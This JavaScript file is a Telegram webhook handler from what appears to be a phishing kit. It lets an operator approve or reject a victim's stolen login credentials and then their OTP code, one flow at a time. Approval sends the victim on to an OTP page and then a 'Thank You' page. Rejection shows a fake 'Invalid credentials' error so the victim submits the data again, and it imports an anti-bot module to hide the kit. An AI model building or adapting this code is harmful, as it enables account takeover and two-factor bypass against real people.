import approvalSystem from "@/lib/approval-system";
import { CPANEL_CONFIG } from "@/config/cpanel-config";
import { isRequestFromBot } from "@/lib/server-antibot";

export async function GET(req) {
  return Response.json({
    ok: true,
    message: "Webhook endpoint is active",
    timestamp: new Date().toISOString(),
    pendingApprovals: approvalSystem.getAllPending().length,
  });
}

export async function POST(req) {
  // Skip bot protection for webhook endpoint - Telegram needs unrestricted access
  console.log("📡 Telegram webhook request received");
  console.log("🔍 User Agent:", req.headers.get("user-agent"));
  console.log("🔍 Content-Type:", req.headers.get("content-type"));
  try {
    const body = await req.json();

    // Handle callback query (button press)
    if (body.callback_query) {
      const callbackQuery = body.callback_query;
      const { data: callbackData, message, from } = callbackQuery;

      // Parse callback data - handle both login and OTP approvals
      let action,
        flowId,
        isOtp = false;

      if (callbackData.includes("_otp_")) {
        // OTP approval: "approve_otp_flowId" or "reject_otp_flowId"
        const otpIndex = callbackData.indexOf("_otp_");
        action = callbackData.substring(0, otpIndex); // approve or reject
        flowId = callbackData.substring(otpIndex + 5); // everything after "_otp_"
        isOtp = true;
      } else {
        // Login approval: "approve_flowId" or "reject_flowId"
        const firstUnderscore = callbackData.indexOf("_");
        action = callbackData.substring(0, firstUnderscore); // approve or reject
        flowId = callbackData.substring(firstUnderscore + 1); // everything after first "_"
      }

      console.log("🔍 Webhook Debug:", {
        callbackData,
        action,
        flowId,
        isOtp,
      });

      // Additional debugging - log the raw callback query
      console.log(
        "🔍 Raw Callback Query:",
        JSON.stringify(callbackQuery, null, 2)
      );

      if (!flowId || !["approve", "reject"].includes(action)) {
        console.log("❌ Invalid callback data:", { flowId, action });
        await answerCallbackQuery(callbackQuery.id, "❌ Invalid callback data");
        return Response.json({ ok: true }); // Ignore invalid callbacks
      }

      // Additional validation
      if (flowId.length < 5) {
        console.log("❌ Flow ID too short:", flowId);
        await answerCallbackQuery(
          callbackQuery.id,
          "❌ Invalid flow ID format"
        );
        return Response.json({ ok: true });
      }

      const approved = action === "approve";
      const reason = approved
        ? null
        : isOtp
        ? "Invalid verification code. Please check and try again."
        : "Invalid credentials. Please check your username and password.";

      console.log("🎯 Processing approval:", { flowId, approved, isOtp });

      // Update approval status
      const success = approvalSystem.setApprovalResult(
        flowId,
        approved,
        reason
      );

      console.log("✅ Approval result:", { success, flowId });

      if (success) {
        // Send confirmation message to admin
        await sendConfirmationMessage(
          message.chat.id,
          message.message_id,
          flowId,
          approved,
          from.first_name || from.username || "Admin",
          isOtp
        );
      } else {
        // If approval not found, it might be a fallback - still acknowledge the button press
        console.log(
          `Approval ${flowId} not found, but acknowledging button press`
        );
        await answerCallbackQuery(
          callbackQuery.id,
          "⚠️ Session not found, but action noted"
        );
        return Response.json({ ok: true });
      }

      // Answer callback query to remove loading state
      await answerCallbackQuery(
        callbackQuery.id,
        approved ? "✅ Approved" : "❌ Rejected"
      );
    }

    return Response.json({ ok: true });
  } catch (e) {
    console.error("Webhook error:", e);
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      status: 500,
    });
  }
}

async function sendConfirmationMessage(
  chatId,
  messageId,
  flowId,
  approved,
  adminName,
  isOtp = false
) {
  const token =
    process.env.TELEGRAM_BOT_TOKEN || CPANEL_CONFIG.TELEGRAM_BOT_TOKEN;
  if (!token || token === "YOUR_BOT_TOKEN_HERE") return;

  try {
    const status = approved ? "✅ APPROVED" : "❌ REJECTED";
    const emoji = approved ? "🟢" : "🔴";
    const requestType = isOtp ? "OTP" : "Login";

    const confirmationText =
      `${emoji} <b>${requestType} ${status}</b>\n\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
      `👤 <b>Action by:</b> ${adminName}\n` +
      `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
      `${
        approved
          ? isOtp
            ? "✅ User will be redirected to Thank You page"
            : "✅ User will be redirected to OTP page"
          : "❌ User will see error message"
      }`;

    // Edit the original message to show the result
    const editUrl = `https://api.telegram.org/bot${token}/editMessageText`;
    await fetch(editUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: confirmationText,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Failed to send confirmation:", error);
  }
}

async function answerCallbackQuery(callbackQueryId, text) {
  const token =
    process.env.TELEGRAM_BOT_TOKEN || CPANEL_CONFIG.TELEGRAM_BOT_TOKEN;
  if (!token || token === "YOUR_BOT_TOKEN_HERE") return;

  try {
    const url = `https://api.telegram.org/bot${token}/answerCallbackQuery`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: false,
      }),
    });
  } catch (error) {
    console.error("Failed to answer callback query:", error);
  }
}
